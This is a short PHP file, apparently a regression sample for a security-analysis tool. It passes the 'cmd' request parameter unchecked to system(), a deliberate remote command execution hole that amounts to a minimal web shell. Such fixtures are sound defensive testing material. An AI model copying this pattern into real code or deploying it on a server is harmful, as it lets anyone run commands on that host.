<?php
// Regression sample: request-controlled command reaches an execution sink.
$cmd = $_GET['cmd'];
system($cmd);
?>
